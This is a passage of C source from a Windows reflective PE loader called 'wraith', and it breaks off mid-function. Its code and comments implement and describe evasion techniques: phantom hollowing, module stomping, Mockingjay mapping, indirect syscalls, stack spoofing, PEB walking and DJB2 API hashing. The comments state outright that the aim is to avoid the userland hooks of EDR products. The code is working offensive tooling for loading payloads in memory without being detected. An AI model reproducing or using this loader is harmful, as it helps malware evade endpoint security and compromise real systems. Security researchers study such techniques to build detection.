
const struct wr_map_ops *wr_map_resolve(wraith_map_strategy_t id)
{
  switch (id) {
  case WRAITH_MAP_PRIVATE_RW_RX:
  return &wr_map_ops_private_rwx;

#if WRAITH_USE_PHANTOM_HOLLOWING
  case WRAITH_MAP_PHANTOM_HOLLOW:
  /* Auto-degradation: when the host process forbids foreign
   * SEC_IMAGE mappings (MicrosoftSignedOnly) or dynamic code
   * (ProhibitDynamicCode), the phantom strategy would crash or
   * be vetoed by the kernel. Silently fall back to private
   * RW->RX so the load still succeeds with the strongest
   * stealth this environment allows. */
  if (phantom_is_blocked()) {
  return &wr_map_ops_private_rwx;
  }
  return &wr_map_ops_phantom;
#endif

#if WRAITH_USE_MODULE_STOMPING
  case WRAITH_MAP_MODULE_STOMPING:
  return &wr_map_ops_stomping;
#endif

  case WRAITH_MAP_MOCKINGJAY:
  return &wr_map_ops_mockingjay;

  default:
  return NULL;
  }
}

unsigned wr_prot_to_win32(wraith_prot_t prot)
{
  unsigned base = 0;
  unsigned modifier = 0;

  if (prot & WRAITH_PROT_NOCACHE) {
  modifier |= PAGE_NOCACHE;
  }
  if (prot & WRAITH_PROT_GUARD) {
  modifier |= PAGE_GUARD;
  }

  switch (prot & 0xff) {
  case WRAITH_PROT_NOACCESS: base = PAGE_NOACCESS;  break;
  case WRAITH_PROT_R:  base = PAGE_READONLY;  break;
  case WRAITH_PROT_RW:  base = PAGE_READWRITE;  break;
  case WRAITH_PROT_RX:  base = PAGE_EXECUTE_READ;  break;
  case WRAITH_PROT_WC:  base = PAGE_WRITECOPY;  break;
  case WRAITH_PROT_RWC:  base = PAGE_WRITECOPY;  break; /* same flag in Win32 */
  case WRAITH_PROT_RXC:  base = PAGE_EXECUTE_WRITECOPY; break;
  default:
  /* Reject RWX combinations explicitly when RW_TO_RX_HYGIENE is on.
  * Currently we never even synthesize the bit, but be defensive. */
  return 0;
  }

  return base | modifier;
}

wraith_prot_t wr_prot_from_section_chars(uint32_t c)
{
  int execute = (c & WRAITH_PE_SCN_MEM_EXECUTE) != 0;
  int read  = (c & WRAITH_PE_SCN_MEM_READ)  != 0;
  int write  = (c & WRAITH_PE_SCN_MEM_WRITE)  != 0;

  /* RW_TO_RX hygiene: there is no RWX state. The loader must commit
  * sections RW, then flip RX after relocations + imports. The "final"
  * protection used here is what `protect` will apply once writes
  * are no longer needed. */
  wraith_prot_t p = WRAITH_PROT_NOACCESS;
  if (execute && read && !write) {
  p = WRAITH_PROT_RX;
  } else if (execute && read && write) {
  /* Forbidden in v2. Caller is expected to split this into a
  * post-write VirtualProtect to RX-only. We return RX so the
  * loader strips the write bit. */
  p = WRAITH_PROT_RX;
  } else if (!execute && read && write) {
  p = WRAITH_PROT_RW;
  } else if (!execute && read && !write) {
  p = WRAITH_PROT_R;
  } else if (execute && !read && !write) {
  p = WRAITH_PROT_RX;  /* read implied for execute on x64 */
  }

  if (c & WRAITH_PE_SCN_MEM_NOT_CACHED) {
  p |= WRAITH_PROT_NOCACHE;
  }
  return p;
}


/* ==========================================================================
 * src/mapping/map_private_rwx.c
 * ========================================================================== */

/*
 * src/mapping/map_private_rwx.c
 *
 * Default mapping strategy. Despite the legacy "PRIVATE_RWX" name, the
 * region transitions are strictly:
 *
 *  reserved (RW only) -> committed RW per section -> protected RX/R/RW
 *
 * No PAGE_EXECUTE_READWRITE is ever requested.
 *
 * indirection: every memory primitive routes through
 * `ctx->rt_ops->nt_*`. With the baseline rt_ops vtable that's a thin
 * wrapper around Win32 (VirtualAlloc, VirtualProtect, ...). With the
 * `ntapi-hashed` vtable it goes through the Hell's Hall syscall engine,
 * making the same code path stealth-capable without a strategy rewrite.
 */




#include <stdlib.h>
#include <windows.h>

typedef struct map_state {
  void  *base;
  size_t size;
} map_state;

static wraith_status_t pr_reserve(struct wr_ctx *ctx, size_t size, void **out_base)
{
  if (!ctx || !out_base || !ctx->rt_ops) {
  return WRAITH_E_NULL_ARG;
  }

  /* Try preferred ImageBase first (lets us skip relocations when the
  * preferred range is free). Then any address. */
  void *base = NULL;
  if (ctx->headers) {
  const wr_pe_nt_headers64 *nt = (const wr_pe_nt_headers64 *)ctx->headers;
  base = (void *)(uintptr_t)nt->OptionalHeader.ImageBase;
  }

  size_t request = size;
  int rc = ctx->rt_ops->nt_alloc(&base, &request,
  MEM_RESERVE | MEM_COMMIT,
  PAGE_READWRITE);
  if (rc != 0 || !base) {
  base = NULL;
  request = size;
  rc = ctx->rt_ops->nt_alloc(&base, &request,
  MEM_RESERVE | MEM_COMMIT,
  PAGE_READWRITE);
  }
  if (rc != 0 || !base) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_RESERVE_FAILED,
  "rt_ops->nt_alloc(size=%zu) -> 0x%x",
  size, (unsigned)rc);
  }

  map_state *st = (map_state *)calloc(1, sizeof(map_state));
  if (!st) {
  size_t zero = 0;
  ctx->rt_ops->nt_free(base, zero, MEM_RELEASE);
  return wr_ctx_fail(ctx, WRAITH_E_OOM, "alloc map_state");
  }
  st->base = base;
  st->size = size;
  ctx->map_state = st;

  *out_base = base;
  return WRAITH_OK;
}

static wraith_status_t pr_commit(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t initial_prot)
{
  if (!ctx || !addr || size == 0 || !ctx->rt_ops) {
  return WRAITH_E_NULL_ARG;
  }
  /* The reserve already committed the whole image with PAGE_READWRITE.
  * Re-committing a sub-range is a no-op but lets the strategy
  * normalize sub-page edges if a future change requires it. */
  unsigned prot = wr_prot_to_win32(initial_prot ? initial_prot : WRAITH_PROT_RW);
  if (!prot) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_RWX_LEAK,
  "rejected RWX request in commit");
  }
  void  *p  = addr;
  size_t sz = size;
  int rc = ctx->rt_ops->nt_alloc(&p, &sz, MEM_COMMIT, prot);
  if (rc != 0) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_COMMIT_FAILED,
  "rt_ops->nt_alloc(MEM_COMMIT) -> 0x%x",
  (unsigned)rc);
  }
  return WRAITH_OK;
}

static wraith_status_t pr_protect(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t new_prot)
{
  if (!ctx || !addr || size == 0 || !ctx->rt_ops) {
  return WRAITH_E_NULL_ARG;
  }
  unsigned w32 = wr_prot_to_win32(new_prot);
  if (!w32) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_RWX_LEAK,
  "rejected RWX request in protect");
  }
  unsigned old = 0;
  int rc = ctx->rt_ops->nt_protect(addr, size, w32, &old);
  if (rc != 0) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_PROTECT_FAILED,
  "rt_ops->nt_protect(0x%p,%zu,0x%x) -> 0x%x",
  addr, size, w32, (unsigned)rc);
  }
  /* Flush ICache after any RX flip - cheap and avoids stale fetches
  * after relocations / IAT writes flipped the page from RW to RX. */
  if (new_prot & (WRAITH_PROT_RX | WRAITH_PROT_RXC)) {
  ctx->rt_ops->nt_flush_icache(addr, size);
  }
  return WRAITH_OK;
}

static wraith_status_t pr_release(struct wr_ctx *ctx)
{
  if (!ctx) {
  return WRAITH_E_NULL_ARG;
  }
  map_state *st = (map_state *)ctx->map_state;
  if (st && st->base && ctx->rt_ops) {
  size_t zero = 0;
  ctx->rt_ops->nt_free(st->base, zero, MEM_RELEASE);
  st->base = NULL;
  st->size = 0;
  }
  return WRAITH_OK;
}

static void pr_destroy(struct wr_ctx *ctx)
{
  if (!ctx) {
  return;
  }
  free(ctx->map_state);
  ctx->map_state = NULL;
}

const struct wr_map_ops wr_map_ops_private_rwx = {
  .name  = "private_rwx",
  .reserve = pr_reserve,
  .commit  = pr_commit,
  .protect = pr_protect,
  .release = pr_release,
  .destroy = pr_destroy,
};


/* ==========================================================================
 * src/runtime/rt_api.c
 * ========================================================================== */

/*
 * src/runtime/rt_api.c
 *
 * Runtime selector. Today this is a one-liner - it returns the
 * baseline. + extends it to:
 *  - prefer the Hell's Hall vtable when WRAITH_F_INDIRECT_SYSCALLS is set
 *  - fall back to baseline if SSN resolution fails
 */



#if WRAITH_USE_STACK_SPOOF
extern void wr_sc_engine_set_thread_spoof(int enabled);
#endif

const struct wr_rt_ops *wr_rt_resolve(struct wr_ctx *ctx)
{
#if WRAITH_USE_STACK_SPOOF
  /* Tell the syscall engine whether this load wants stack-spoofed
  * trampolines. The toggle is per-thread; loads on different
  * threads can request different policies. */
  if (ctx) {
  wr_sc_engine_set_thread_spoof(
  (ctx->flags & WRAITH_F_STACK_SPOOF) ? 1 : 0);
  }
#endif

#if WRAITH_USE_API_HASHING
  if (ctx && (ctx->flags & WRAITH_F_API_HASHING)) {
  return &wr_rt_ops_ntapi;
  }
#endif
  (void)ctx;
  return &wr_rt_ops_baseline;
}


/* ==========================================================================
 * src/runtime/rt_api_baseline.c
 * ========================================================================== */

/*
 * src/runtime/rt_api_baseline.c
 *
 * Win32 baseline implementation of the runtime vtable. This is the
 * "obvious" path - it goes through LoadLibraryA / GetProcAddress and
 * therefore lights up every userland hook an EDR has installed. That's
 * intentional: the baseline exists so the upgrade path to indirect
 * syscalls is a vtable swap, not a loader rewrite.
 */


#include <windows.h>

static wraith_status_t rt_load_library(struct wr_ctx *ctx,
  const char *name,
  wraith_foreign_module_t *out)
{
  if (!ctx || !name || !out) {
  return WRAITH_E_NULL_ARG;
  }

  /* User-provided callback wins, so consumers can intercept
  * dependency loads (e.g. to apply their own caching). */
  if (ctx->user_loadlib) {
  wraith_foreign_module_t m = ctx->user_loadlib(name, ctx->user_data);
  if (!m) {
  return wr_ctx_fail(ctx, WRAITH_E_IMP_DLL_NOT_FOUND,
  "user_loadlib(\"%s\") returned NULL", name);
  }
  *out = m;
  return WRAITH_OK;
  }

  HMODULE h = LoadLibraryA(name);
  if (!h) {
  return wr_ctx_fail(ctx, WRAITH_E_IMP_DLL_NOT_FOUND,
  "LoadLibraryA(\"%s\") failed: 0x%08lx",
  name, (unsigned long)GetLastError());
  }
  *out = (wraith_foreign_module_t)h;
  return WRAITH_OK;
}

static wraith_status_t rt_get_proc(struct wr_ctx *ctx,
  wraith_foreign_module_t module,
  const char *name,
  void **out_proc)
{
  if (!ctx || !module || !name || !out_proc) {
  return WRAITH_E_NULL_ARG;
  }

  if (ctx->user_getproc) {
  void *p = ctx->user_getproc(module, name, ctx->user_data);
  if (!p) {
  return wr_ctx_fail(ctx, WRAITH_E_IMP_PROC_NOT_FOUND,
  "user_getproc(\"%s\") returned NULL", name);
  }
  *out_proc = p;
  return WRAITH_OK;
  }

  FARPROC p = GetProcAddress((HMODULE)module, name);
  if (!p) {
  return wr_ctx_fail(ctx, WRAITH_E_IMP_PROC_NOT_FOUND,
  "GetProcAddress(\"%s\") failed: 0x%08lx",
  name, (unsigned long)GetLastError());
  }
  *out_proc = (void *)p;
  return WRAITH_OK;
}

static void rt_free_library(struct wr_ctx *ctx,
  wraith_foreign_module_t module)
{
  if (!module) {
  return;
  }
  if (ctx && ctx->user_freelib) {
  ctx->user_freelib(module, ctx->user_data);
  return;
  }
  FreeLibrary((HMODULE)module);
}

/* -------------------------------------------------------------------------
 * Memory primitives (Win32 path).
 * ------------------------------------------------------------------------- */

static int rt_nt_alloc(void **addr, size_t *size,
  unsigned alloc_type, unsigned protect)
{
  LPVOID p = VirtualAlloc(*addr, *size, alloc_type, protect);
  if (!p) {
  return (int)GetLastError();
  }
  *addr = p;
  return 0;
}

static int rt_nt_protect(void *addr, size_t size,
  unsigned new_protect, unsigned *old_protect)
{
  DWORD old = 0;
  if (!VirtualProtect(addr, size, new_protect, &old)) {
  return (int)GetLastError();
  }
  if (old_protect) {
  *old_protect = (unsigned)old;
  }
  return 0;
}

static int rt_nt_free(void *addr, size_t size, unsigned free_type)
{
  if (!VirtualFree(addr, size, free_type)) {
  return (int)GetLastError();
  }
  return 0;
}

static void rt_nt_flush_icache(void *addr, size_t size)
{
  FlushInstructionCache(GetCurrentProcess(), addr, size);
}

const struct wr_rt_ops wr_rt_ops_baseline = {
  .name  = "baseline-win32",
  .load_library  = rt_load_library,
  .get_proc  = rt_get_proc,
  .free_library  = rt_free_library,
  .nt_alloc  = rt_nt_alloc,
  .nt_protect  = rt_nt_protect,
  .nt_free  = rt_nt_free,
  .nt_flush_icache = rt_nt_flush_icache,
};


/* ==========================================================================
 * src/runtime/rt_pebwalk.c
 * ========================================================================== */

#define wr_ldr_entry _wr_amalg_wr_ldr_entry__rt_pebwalk
/*
 * src/runtime/rt_pebwalk.c
 *
 * Implementation of the PEB walker. Notes:
 *
 *  - On x64, the PEB is reachable via TEB.ProcessEnvironmentBlock at
 *  gs:[0x60]. We use the documented `NtCurrentTeb()` intrinsic so
 *  the code compiles cleanly on MinGW + MSVC + Clang-cl.
 *
 *  - `LDR_DATA_TABLE_ENTRY`'s public layout in <winternl.h> stops at
 *  `BaseDllName`; that's all we need. To stay forward-compatible we
 *  define our own minimal struct rather than depend on toolchain
 *  header layout.
 *
 *  - We walk InMemoryOrderModuleList rather than InLoadOrderModuleList
 *  because the head LIST_ENTRY pointer offset within the entry is
 *  stable across decades of Windows versions for InMemoryOrder, and
 *  because the OS loader uses this list internally.
 */


#include <windows.h>
#include <winternl.h>

/* Minimal LDR_DATA_TABLE_ENTRY - we only access fields up to BaseDllName.
 * Layout is stable Win10 1809 .. Win11 24H2. */
typedef struct wr_ldr_entry {
  LIST_ENTRY  InLoadOrderLinks;  /* +0x00 */
  LIST_ENTRY  InMemoryOrderLinks;  /* +0x10 */
  LIST_ENTRY  InInitializationOrderLinks; /* +0x20 */
  PVOID  DllBase;  /* +0x30 */
  PVOID  EntryPoint;  /* +0x38 */
  ULONG  SizeOfImage;  /* +0x40 */
  UNICODE_STRING FullDllName;  /* +0x48 */
  UNICODE_STRING BaseDllName;  /* +0x58 */
} wr_ldr_entry;

#define WRAITH_LDR_ENTRY_FROM_INMEMORY(p) \
  ((wr_ldr_entry *)((uint8_t *)(p) - offsetof(wr_ldr_entry, InMemoryOrderLinks)))

wraith_status_t wr_pebwalk_find_module(uint32_t name_hash, void **out_base)
{
  if (!out_base) {
  return WRAITH_E_NULL_ARG;
  }
  *out_base = NULL;

  PPEB peb = (PPEB)NtCurrentTeb()->ProcessEnvironmentBlock;
  if (!peb || !peb->Ldr) {
  return WRAITH_E_RT_PEB_WALK_FAILED;
  }

  PLIST_ENTRY head =
  (PLIST_ENTRY)&((PPEB_LDR_DATA)peb->Ldr)->InMemoryOrderModuleList;
  PLIST_ENTRY cur = head->Flink;

  while (cur && cur != head) {
  wr_ldr_entry *e = WRAITH_LDR_ENTRY_FROM_INMEMORY(cur);
  if (e->BaseDllName.Buffer && e->BaseDllName.Length > 0) {
  size_t chars = e->BaseDllName.Length / sizeof(wchar_t);
  uint32_t h = wr_djb2_w_n(e->BaseDllName.Buffer, chars);
  if (h == name_hash) {
  /* Guard against placeholder / partially-initialised entries
  * where the BaseDllName matched but the image isn't actually
  * mapped. Anything below the lowest user-mode page (0x10000)
  * is either NULL or a bogus value the kernel never produces -
  * reporting OK with such a base crashes downstream consumers
  * that deref it expecting a valid PE image. */
  if (!e->DllBase || (uintptr_t)e->DllBase < 0x10000) {
  cur = cur->Flink;
  continue;
  }
  *out_base = e->DllBase;
  return WRAITH_OK;
  }
  }
  cur = cur->Flink;
  }
  return WRAITH_E_RT_PEB_WALK_FAILED;
}

wraith_status_t wr_pebwalk_find_module_a(const char *name, void **out_base)
{
  if (!name) {
  return WRAITH_E_NULL_ARG;
  }
  return wr_pebwalk_find_module(wr_djb2_a(name), out_base);
}

#undef wr_ldr_entry


/* ==========================================================================
 * src/runtime/rt_resolver.c
 * ========================================================================== */

/*
 * src/runtime/rt_resolver.c
 *
 * Hash-based export resolver. Walks the export directory of a loaded
 * module (`module_base` points at the IMAGE_DOS_HEADER), hashes each
 * exported name, and returns the address whose hash matches.
 *
 * Forwarder handling: an export entry is treated as a forwarder
 * ("DLL.Func" or "DLL.#NNN" string instead of code) when ANY of:
 *   1. its RVA falls inside the export directory range (the
 *      canonical Microsoft layout);
 *   2. its RVA falls in a PE section that lacks IMAGE_SCN_MEM_EXECUTE
 *      (catches api-set forwarders on Win11 24H2 ntdll whose strings
 *      live in .rdata outside the export dir);
 *   3. its live page protection (via VirtualQuery) lacks any EXECUTE
 *      bit - section header can disagree with the runtime VM mapping
 *      (per-page loader resets, third-party hooks, api-set proxy
 *      tables that re-map a stub page R-only).
 *
 * Any one criterion flips us into forwarder-parsing mode. Returning
 * a non-executable pointer would DEP-fault the caller on its first
 * indirect call (ExceptionCode 0xC0000005, ExceptionAddress ==
 * FaultAddress) - notoriously hard to attribute to the resolver
 * because the crash happens well after the resolver returns. The
 * runtime check guarantees the resolver either follows the chain
 * to a real executable target or returns an error - never a NX
 * pointer. We chase the chain by:
 *   - Resolving the target DLL via PEB.Ldr first (zero side effects).
 *   - Falling back to LoadLibraryA (hash-resolved from kernel32) when
 *     the target DLL is not in PEB.Ldr - this is the common case for
 *     api-set forwarders ("api-ms-win-core-*.dll"), which the Windows
 *     loader resolves via the schema mechanism rather than as real
 *     PE modules.
 *   - Following ordinal forwarders ("DLL.#NNN") via the ordinal table.
 *
 * Cycles bounded by WRAITH_RESOLVER_MAX_FOLLOW (8); real-world chains
 * never exceed 2-3 in practice.
 */




#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define WRAITH_RESOLVER_MAX_FOLLOW 8

/* ------------------------------------------------------------------------ */
/*  LoadLibraryA fallback (for forwarders into not-yet-loaded modules)      */
/* ------------------------------------------------------------------------ */

typedef HMODULE (WINAPI *wr_load_lib_a_fn)(LPCSTR);
typedef FARPROC (WINAPI *wr_get_proc_addr_fn)(HMODULE, LPCSTR);

static wr_load_lib_a_fn  g_resolver_LoadLibraryA  = NULL;
static wr_get_proc_addr_fn g_resolver_GetProcAddr = NULL;

/* DJB2 hashes of "kernel32.dll" and "LoadLibraryA". Computed at compile
 * time and verified against the pre-existing constants in
 * rt_api_ntapi.c so any drift is caught by the CI build. The
 * GetProcAddress hash is computed at runtime in bootstrap_get_proc_addr -
 * the schema-aware fallback runs once per program lifetime so the
 * runtime hash cost is negligible. */
#define WR_RESOLVER_H_kernel32_dll   0x7040ee75u
#define WR_RESOLVER_H_LoadLibraryA   0x0666395bu

/* Forward decl - the lookup recurses, and so does the bootstrap path. */
static wraith_status_t lookup_inner(void *module_base, uint32_t name_hash,
                                    int depth, void **out_proc);
static wraith_status_t lookup_ordinal_inner(void *module_base, uint16_t ordinal,
                                             int depth, void **out_proc);

static wraith_status_t bootstrap_loadlibrary(void)
{
    if (g_resolver_LoadLibraryA) {
        return WRAITH_OK;
    }
    void *k32 = NULL;
    wraith_status_t rc =
        wr_pebwalk_find_module(WR_RESOLVER_H_kernel32_dll, &k32);
    if (rc != WRAITH_OK) {
        return rc;
    }
    void *p = NULL;
    rc = lookup_inner(k32, WR_RESOLVER_H_LoadLibraryA, 0, &p);
    if (rc != WRAITH_OK) {
        return rc;
    }
    g_resolver_LoadLibraryA = (wr_load_lib_a_fn)p;
    return WRAITH_OK;
}

/* Bootstrap GetProcAddress for the self-referencing api-set fallback path.
 * kernel32!GetProcAddress is a forwarder to KERNELBASE!GetProcAddress on
 * modern Win11 - that recursion bottoms out in 2 levels (KERNELBASE has
 * the real implementation as a non-forwarder export), so it never triggers
 * the self-loop path itself. */
static wraith_status_t bootstrap_get_proc_addr(void)
{
    if (g_resolver_GetProcAddr) {
        return WRAITH_OK;
    }
    void *k32 = NULL;
    wraith_status_t rc =
        wr_pebwalk_find_module(WR_RESOLVER_H_kernel32_dll, &k32);
    if (rc != WRAITH_OK) {
        return rc;
    }
    void *p = NULL;
    rc = lookup_inner(k32, wr_djb2_a("GetProcAddress"), 0, &p);
    if (rc != WRAITH_OK) {
        return rc;
    }
    g_resolver_GetProcAddr = (wr_get_proc_addr_fn)p;
    return WRAITH_OK;
}

/* Schema-aware fallback for self-referencing api-set forwarders.
 *
 * Background: on Win11, several kernel32 exports forward to api-set
 * pseudo-DLLs (e.g. "api-ms-win-core-processthreads-l1-1-0.dll"). The
 * Windows loader resolves api-sets via the per-process ApiSetMap in the
 * PEB; without that schema knowledge, our LoadLibraryA fallback may
 * return the SAME host module we started from (the api-set host on this
 * Windows build is kernel32 itself, not the implementation DLL). Recursing
 * through lookup_inner then re-finds the same forwarder string and loops
 * until WRAITH_RESOLVER_MAX_FOLLOW kicks us out with FORWARDER_LOOP.
 *
 * GetProcAddress, by contrast, calls into LdrpResolveForwardForGetProcAddress
 * which uses the schema and returns the real implementation. We pay a
 * small IOC cost here (one extra call into a well-known kernel32 export)
 * but only on this narrow self-loop path; non-looping forwarders still
 * resolve via the hash path. */
static wraith_status_t schema_aware_lookup(void *module_base, const char *func_name,
                                           uint16_t ordinal, int by_ordinal,
                                           void **out_proc)
{
    wraith_status_t rc = bootstrap_get_proc_addr();
    if (rc != WRAITH_OK) {
        return rc;
    }
    FARPROC fp = NULL;
    if (by_ordinal) {
        fp = g_resolver_GetProcAddr((HMODULE)module_base,
                                    (LPCSTR)(uintptr_t)ordinal);
    } else {
        fp = g_resolver_GetProcAddr((HMODULE)module_base, func_name);
    }
    if (!fp) {
        return WRAITH_E_IMP_PROC_NOT_FOUND;
    }
    *out_proc = (void *)fp;
    return WRAITH_OK;
}

static wraith_status_t resolve_dependency(const char *dll_name, void **out_base)
{
    if (!out_base || !dll_name) {
        return WRAITH_E_NULL_ARG;
    }
    *out_base = NULL;

    /* Try PEB.Ldr first - zero-API path. Treat OK-with-NULL as failure
     * (defensive: rt_pebwalk_find_module is supposed to filter those,
     * but we don't trust it on cold paths). */
    if (wr_pebwalk_find_module(wr_djb2_a(dll_name), out_base) == WRAITH_OK
        && *out_base != NULL) {
        return WRAITH_OK;
    }
    *out_base = NULL;

    /* Fall back to LoadLibraryA. The Windows loader resolves api-set
     * schema entries through this path, returning the actual host DLL
     * base. */
    wraith_status_t rc = bootstrap_loadlibrary();
    if (rc != WRAITH_OK) {
        return rc;
    }
    HMODULE m = g_resolver_LoadLibraryA(dll_name);
    if (!m) {
        return WRAITH_E_RT_PEB_WALK_FAILED;
    }
    *out_base = (void *)m;
    return WRAITH_OK;
}


/* ------------------------------------------------------------------------ */
/*  Image bounds helpers                                                    */
/* ------------------------------------------------------------------------ */

static int forward_in_export_dir(uint8_t *base,
                                  PIMAGE_DATA_DIRECTORY dir, void *p)
{
    if (dir->Size == 0) {
        return 0;
    }
    uintptr_t lo = (uintptr_t)(base + dir->VirtualAddress);
    uintptr_t hi = lo + dir->Size;
    uintptr_t v  = (uintptr_t)p;
    return v >= lo && v < hi;
}

/* Returns 1 if `rva` falls inside a PE section that has the
 * IMAGE_SCN_MEM_EXECUTE characteristic set; 0 otherwise.
 *
 * Used as a second forwarder-detection criterion: a few forwarder
 * strings (notably some api-set entries on Win11 24H2 ntdll) live
 * in .rdata outside the export-directory range. When
 * forward_in_export_dir() says "no" but the candidate RVA actually
 * points into a non-executable section, the bytes there are an
 * ASCII "DLL.Func" string, not real x64 code. Returning the literal
 * pointer would crash the caller on its first indirect call with
 * ExceptionCode == 0xC0000005 and ExceptionAddress == FaultAddress
 * pointing at the .rdata page (DEP/NX fault).
 *
 * Returns 0 (defensive "not executable") in failure modes:
 *   - PE headers don't parse
 *   - The RVA falls outside every section (likely garbage)
 *   - The matching section lacks IMAGE_SCN_MEM_EXECUTE
 */
static int rva_in_executable_section(uint8_t *base, DWORD rva)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }
    PIMAGE_NT_HEADERS64 nt =
        (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }
    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)(
        (uint8_t *)&nt->OptionalHeader
        + nt->FileHeader.SizeOfOptionalHeader);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        DWORD lo = sec->VirtualAddress;
        DWORD vsz = sec->Misc.VirtualSize ? sec->Misc.VirtualSize
                                           : sec->SizeOfRawData;
        DWORD hi = lo + vsz;
        if (rva >= lo && rva < hi) {
            return (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)
                       ? 1 : 0;
        }
    }
    return 0;
}

/* Returns 1 iff `p` lives on a page the OS *currently* treats as
 * executable. Used as a third forwarder-detection criterion to catch
 * the case where the section header's IMAGE_SCN_MEM_EXECUTE bit
 * disagrees with the live VM mapping - e.g. an api-set forwarder whose
 * string is in a section the loader marked R-only at runtime, or a
 * page that a third-party hook flipped to RW for patching. The static
 * section walk would say "executable", but the indirect call would
 * still DEP-fault.
 *
 * Returns 0 in any failure mode (VirtualQuery error, MEM_FREE, no
 * EXECUTE bit). The resolver treats 0 as "looks like a forwarder
 * string" and falls into the chase path, which either follows the
 * forwarder successfully or returns a clean error - never a NX
 * pointer that crashes the caller. */
static int page_is_executable(const void *p)
{
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T qb = VirtualQuery(p, &mbi, sizeof(mbi));
    if (qb < sizeof(mbi)) {
        return 0;
    }
    if (mbi.State != MEM_COMMIT) {
        return 0;
    }
    const DWORD exec_mask = PAGE_EXECUTE | PAGE_EXECUTE_READ
                          | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY;
    return (mbi.Protect & exec_mask) ? 1 : 0;
}

/* Bounded strchr: scans at most `cap` bytes starting at `s` for `c`,
 * stopping at NUL. Returns NULL if not found within bounds. Used for
 * forwarder strings where the buffer is bounded by the export dir
 * size and we can't trust the data to be NUL-terminated. */
static const char *bounded_strchr(const char *s, char c, size_t cap)
{
    for (size_t i = 0; i < cap; ++i) {
        if (s[i] == '\0') return NULL;
        if (s[i] == c) return s + i;
    }
    return NULL;
}

static size_t bounded_strlen(const char *s, size_t cap)
{
    for (size_t i = 0; i < cap; ++i) {
        if (s[i] == '\0') return i;
    }
    return cap;
}

/* ------------------------------------------------------------------------ */
/*  Core lookup - by hash                                                   */
/* ------------------------------------------------------------------------ */

static wraith_status_t lookup_inner(void *module_base, uint32_t name_hash,
                                    int depth, void **out_proc)
{
    if (depth >= WRAITH_RESOLVER_MAX_FOLLOW) {
        return WRAITH_E_IMP_FORWARDER_LOOP;
    }
    if (!out_proc) {
        return WRAITH_E_NULL_ARG;
    }
    *out_proc = NULL;
    if (!wr_looks_like_valid_base(module_base)) {
        return WRAITH_E_NULL_ARG;
    }

    uint8_t *base = (uint8_t *)module_base;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return WRAITH_E_RT_API_NOT_RESOLVED;
    }
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return WRAITH_E_RT_API_NOT_RESOLVED;
    }
    DWORD image_size = nt->OptionalHeader.SizeOfImage;
    PIMAGE_DATA_DIRECTORY dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (dir->Size == 0 || dir->VirtualAddress == 0) {
        return WRAITH_E_RT_API_NOT_RESOLVED;
    }

    PIMAGE_EXPORT_DIRECTORY exp =
        (PIMAGE_EXPORT_DIRECTORY)(base + dir->VirtualAddress);
    if (exp->NumberOfNames == 0) {
        return WRAITH_E_RT_API_NOT_RESOLVED;
    }

    DWORD *name_rvas = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ord_rvas  = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *func_rvas = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        DWORD name_rva = name_rvas[i];
        if (name_rva == 0 || name_rva >= image_size) {
            /* Defensive: malformed export table. Skip, don't deref. */
            continue;
        }
        const char *name = (const char *)(base + name_rva);
        if (wr_djb2_a(name) != name_hash) {
            continue;
        }
        WORD ordinal = ord_rvas[i];
        if (ordinal >= exp->NumberOfFunctions) {
            return WRAITH_E_EXP_BAD_ORDINAL;
        }
        DWORD frva = func_rvas[ordinal];
        if (frva == 0 || frva >= image_size) {
            return WRAITH_E_RT_API_NOT_RESOLVED;
        }

        void *candidate = base + frva;

        /* Forwarder detection. Three-criteria:
         *   (1) candidate RVA falls within the export directory range
         *       (the canonical Microsoft layout - "DLL.Func" strings
         *       live alongside the export tables).
         *   (2) candidate RVA falls in a non-executable section. Some
         *       api-set forwarders on Win11 24H2 ntdll place their
         *       strings in .rdata outside the export-dir range; the
         *       RVA is still valid, but treating it as a function
         *       pointer would DEP-fault on the first indirect call.
         *   (3) candidate's live page protection lacks any EXECUTE
         *       bit. The static section walk in (2) trusts the on-disk
         *       Characteristics flag, which can disagree with the
         *       runtime VM mapping (loader-applied per-section reset,
         *       third-party hooks flipping pages to RW, api-set proxy
         *       tables, etc.). VirtualQuery sees real state.
         *
         * Any condition flips us into forwarder-parsing mode. The
         * later criteria short-circuit when an earlier one matches
         * (cheap path stays cheap on canonical Microsoft layout). */
        int is_forwarder = forward_in_export_dir(base, dir, candidate)
                           || !rva_in_executable_section(base, frva)
                           || !page_is_executable(candidate);

        if (is_forwarder) {
            const char *fwd = (const char *)candidate;
            /* Forwarder strings normally live inside the export dir;
             * bound the search by whichever cap is tighter so a
             * malformed entry can't walk past the section. */
            uintptr_t hi = (uintptr_t)(base + dir->VirtualAddress + dir->Size);
            if ((uintptr_t)fwd >= hi) {
                /* Out-of-export-dir forwarder (criterion 2 path). Fall
                 * back to image-size as the upper bound; bounded_strchr
                 * will stop at the first NUL anyway. */
